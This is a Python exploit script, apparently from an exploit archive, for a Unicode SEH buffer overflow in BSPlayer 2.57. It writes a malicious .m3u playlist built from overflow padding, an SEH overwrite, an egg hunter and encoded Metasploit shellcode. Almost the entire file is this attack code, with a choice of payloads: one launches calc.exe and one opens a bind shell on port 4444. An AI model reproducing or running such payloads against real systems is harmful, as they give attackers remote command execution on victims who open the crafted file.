#
#
#[+]Exploit Title: Exploit Buffer Overfloe Bsplayer 2.57(UNICODE-SEH)
#[+]Date: 01\07\2010
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.bsplayer.com/services/downlad-free-bsplayer.php?type=2
#[+]Version: 2.57
#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN
#[+]CVE: N/A
#
#
#  #########      ##   #########      #########  ##     ###############
#  #########    ####   #########      #########  ##     ##           ##    
#  ##         ## ##    ##             ##         ##     ##           ## 
#  ##        ##  ##    ##             ##         ##     ##           ##
#  ##       ########## ########       ########   ##     ##           ##
#  ##            ##          ##             ##   ##     ##           ##
#  ##            ##          ##             ##   ##     ##           ##
#  ########      ##    ########      #########   ##     ##           ##
#  ########      ##    ########      #########   \/     ###############
#                                              
#Created By C4SS!0 G0M3S
#Louredo_@hotmail.com
#www.invasao.com.br
#
#


import os
import sys
import time
import string

os.system("cls")
os.system("color 4f")

def usage():
        print "\n"
        print "[+]Exploit: Exploit Buffer Overflow Bsplayer(UNICODE-SEH)"
        print "[+]Date: 01\\07\\2010"
        print "[+]Author: C4SS!0 G0M3S"
        print "[+]Home: www.invasao.com.br"
        print "[+]E-mail: Louredo_@hotmail.com"
        print "[+]Version: 2.57"
        print "[+]Software: Bsplayer 2.57\n"
        print "[-]Note:"
        print "TO EXPLOIT THE RUN FILE NAME MUST BE FILE_NAME.M3U\n"


if((len(sys.argv)!=3) or (int(sys.argv[1])<1) or (int(sys.argv[1])>2)):
        usage()
        print "Payloads:\n1 - WinExec(\"Calc.exe\",0)\n2 - Reverse_Tcp_Shell\n"
        print "[-]Usage: "+sys.argv[0]+" <Playload Number> <File Name>"
        print "[-]Exemple: "+sys.argv[0]+" 1 Exploit.m3u"
        sys.exit(0)

usage()
buffer = "\x42" * 4102
nseh = "\x61\x6d"
seh = "\xde\x4e" #pop ebx - pop ebp - ret at 0x004E00DE [bsplayer.exe]
egg_hunter = "\x45\x61\x45\x61\x45\x50\x45\xc3"

junk = "\x45" * 1094
print "[*]Identifying the length Shellcode"
time.sleep(1)
if int(sys.argv[1]) == 2:
	shellcode = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ"
	"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBNKWY7N4PV9X6PQX1PV9JYNZ9SDMTZTR" # 
	"83SY0KT01RPLLLCBPLLT2RLPJX9KKTOX3NZUKKV0VLK3Y3MLRONMMJU2VWC8VQKQSOPTZT3CTK1LPUR6" #
	"KZR65RJC7NPWDLVRZQUMFMV85BXR7BOG8SCKUNXUVMVGIPMKJJZ6XSQ40ORI2UTOWNWRXVF679XJWYPL" #FROM METASPLOIT FRAMEWORK 
	"OU2QOXQNN0GGLNM3HJLRVWUSKO4OWMVOZKXLKLY2B3U1BQMPEBVMQEEFULKP12N8GHWH43CROTS2NPPD" #
	"QT0YXLS5MOM3OCKSRWPFLJWWN19PSXXOFKYD7KLN3WYMFFEJY7LO785W6C1TM7MOURUH7EOM1FZTEMOJ" #SHELLCODE REVERSE_TCP_SHELL ON PORT 4444
	"28TUN2LK0SKNTKKPHJSDRKLFONNC2620QXQTRFZUE3UGR8TOL5V3YO47PRSMMBURNNL9MNEHNELX5NOW" #
	"Q8C5UPOLK3BIRSQBOXVDD9STOI8LHBM1Y3PEPOKMQOMKRN8JZIJ3MPJ0VRRYY92VP0DLVJ3TVJFWKSKB" #PROMPT:
	"QCMXW7O30CRZRF7JK7JV4S2SRM9M5RRTOZZVFYQQDKKW1LY7S6LZFJLLZNXMJB685QOJGLNKNITOCZSK" #
	"QITVVPONFL6LN0O1RVBINM6OLML4XL0TNL6RRVN28UOKSULQJXYLLY9NLM57LVDS8NY2PMQ3MORRMHQD" #C:\>Telnet 127.0.0.1 4444
	"BEINV9QY8U0MN1ZTUPPO3KGMVDOQWLNEUOJLWKE6UPNMBX12QURRNVJN78DYMXKOMHNA")            # 
                                                                                       #
if int(sys.argv[1]) == 1:
        shellcode = ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ"
        "ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBIKY0NQ99GO3LLVRPHLXY2TMTL46QMNR"
        "8P1SHN853YXKLKSSHQXL4TENPSHWL3599RX6VNCJUKCH4VNSMM25ZOJP2MLWORBZMMM1DJ5QVO9MQ9W4"
        "V30ZUBQWZLFP5KELTXGCLKKMKLE2KZPNG9MOXKMNBNXMKVBK893KGOKSJXOPLPOMS8SR3UTPWKGHXOKT"
        "CDN4CMOQG1C34R171NSXML5WVKE7QSN4XL5VJZQM5W8O669OMOK90J9KN0Q31VVLNNOCUN957X7SHNOP"
        "YTP3KXWLE3O9XCKXJA")

print "[*]The Length Shellcode:"+str(len(shellcode))

time.sleep(1)

shellcode += "\x41" * 5000

file = str(sys.argv[2])

payload = buffer+nseh+seh+egg_hunter+junk+shellcode

op = "w"
print "[*]Creating Your File "+file
time.sleep(1)
try:
        f = open(file,op)
        f.write("http://"+payload)
        f.close()
        print "[*]The File "+file+" was Successfully Created"
except:
        print "[*]Error Creating File "+file
